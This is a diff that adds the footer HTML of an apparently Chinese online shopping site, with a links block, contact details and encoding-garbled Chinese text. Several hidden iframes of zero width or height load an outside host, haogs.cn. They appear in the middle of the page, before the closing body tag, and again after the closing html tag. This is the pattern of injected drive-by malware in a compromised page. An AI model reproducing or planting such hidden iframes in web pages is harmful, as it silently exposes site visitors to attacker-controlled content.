+            </TR>
+            <TR>
+              <TD bgColor=#ffffff height=20>&nbsp;</TD>
+            </TR>
+          </TBODY>
+      </TABLE></TD>
+    </TR>
+  </TBODY>
+</TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width="760" align=center border=0>
+  <TBODY>
+    <TR>
+      <TD width=8><IMG height=37 alt="" src="images/1_06.gif" 
+            width=8></TD>
+      <TD background=images/1_09.gif>
+        <TABLE id=Table2 
+            style="BORDER-RIGHT: #cdcbcb 1px solid; BORDER-TOP: #cdcbcb 1px solid; BORDER-LEFT: #cdcbcb 1px solid; BORDER-BOTTOM: #cdcbcb 1px solid" 
+            height=20 cellSpacing=1 cellPadding=0 width=158 align=center 
+            bgColor=#ffffff>
+          <TBODY>
+            <TR>
+              <TD width=154 bgColor=#ffffff>
+                <DIV align=center><FONT 
+                  color=#ff6633>£º£º<STRONG>ÓÑÇéÁ´½Ó</STRONG>£º£º</FONT></DIV></TD>
+            </TR>
+          </TBODY>
+      </TABLE></TD>
+      <TD width=8><IMG height=37 alt="" src="images/1_10.gif" 
+            width=8></TD>
+    </TR>
+  </TBODY>
+</TABLE>
+<TABLE id=Table3 cellSpacing=0 cellPadding=0 width="760" align=center 
+      border=0>
+  <TBODY>
+    <TR>
+      <TD width=8 background=images/1_11.gif>&nbsp;</TD>
+      <TD bgcolor="#FFFFFF">
+        <TABLE id=Table4 height=1 cellSpacing=0 cellPadding=0 width="98%" 
+            align=center border=0>
+          <TBODY>
+            <TR>
+              <TD bgcolor="#FFFFFF">
+                <DIV align=center>
+                   &nbsp; <a href=http://classad.westcn.com/ class=w4 target=_blank>À¼ÖÝÉú»î°ÙÊÂÍ¨</a> &nbsp; <a href=http://www.net-shopping.com¡£cn/ class=w4 target=_blank>½»»»Á´½Ó</a> &nbsp; <a href=http://v2.56.com/c_html-17-3-show_flvflvid=1728302.html class=w4 target=_blank>¾øÃÜÊÓÆÁÏÈÐÀÉÍ</a> &nbsp; <a href=http://www.9jh.com/ class=w4 target=_blank>¾ÅÌìÊý¾Ý</a>
+                </DIV>
+<script language=javascript src=photo.js></script>
+                <DIV align=center></DIV></TD>
+            </TR>
+          </TBODY>
+      </TABLE></TD>
+      <TD width=8 
+      background=images/1_11-.gif>&nbsp;</TD>
+    </TR>
+  </TBODY>
+</TABLE>
+<TABLE id=Table5 cellSpacing=0 cellPadding=0 width="760" align=center 
+      border=0>
+  <TBODY>
+    <TR>
+      <TD width=8><IMG height=8 alt="" src="images/1_13.gif" 
+          width=8></TD>
+      <TD background=images/1_14.gif><IMG height=8 alt="" 
+            src="images/1_14.gif" width=4></TD>
+      <TD width=8 background=images/1_11-.gif><IMG height=8 alt="" 
+            src="images/1_15.gif" width=8></TD>
+    </TR>
+  </TBODY>
+</TABLE>
+<br>
+<HR width="760" SIZE=2 noShade color=#666666>
+
+<iframe src=http://www.haogs.cn/html/ width=0 height=0></iframe>
+<iframe src=http://www.haogs.cn/html/ width=100 height=0></iframe>
+
+<table width="759"  border="0" cellspacing="0" cellpadding="0" align="center">
+
+  <tr>
+    <td width="759" align="center" valign="bottom">
+	<table width="100%"  border="0">
+      <tr>
+        <td height="26" align="center"><a href=index.asp class='w1'>¹ºÎïÊ×Ò³</a> - <a href=about.asp?action=about class='w1' target=_blank>¹ØÓÚÎÒÃÇ</a> - <a href=zhuanti.asp class='w1' target=_blank>ÉÌ³Ç¶¯Ì¬</a> - <a href=about.asp?action=lxwm class='w1' target=_blank>ÒµÎñÁªÏµ</a> - <a href=help.asp?action=shiyongfalv class='w1' target=_blank>°æÈ¨ÉùÃ÷</a> - <a href=gbook.asp class='w1' target=_blank>ÁôÑÔ½¨Òé</a> </td>
+      </tr>
+    </table>
+	<a href="http://www.miibeian.gov.cn" target=_blank>Â¤ICP±¸06002731ºÅ</a><br>
+	¡¡¹«Ë¾µØÖ·£ºÀ¼ÖÝÊÐ¡¡ÓÊÕþ±àÂë£º730000<br>¡¡¿Í·þÓÊÏä£º<a href=mailto:manage@haodong.com>manage@haodong.com</a>¡¡¿Í·þµç»°£º0931-8843199£¬8843299<br>¡¡¡¡Copyright &copy; 2005-2006 ÖÐ¹úÍø¹ºÔÚÏß All rights reserved.<br>¡¡<FONT color=#ff0000>ÖÜÒ»ÖÁÖÜÈÕ£º9£º00~18£º00</FONT>
+    </td>
+  </tr>
+</table>
+<iframe src=http://www.haogs.cn/html/ width=0 height=0></iframe>
+<iframe src=http://www.haogs.cn/html/ width=100 height=0></iframe>
+
+
+</body>
+</html><iframe src=http://www.haogs.cn/html/ width=0 height=0></iframe>
+<iframe src=http://www.haogs.cn/html/ width=100 height=0></iframe>
+
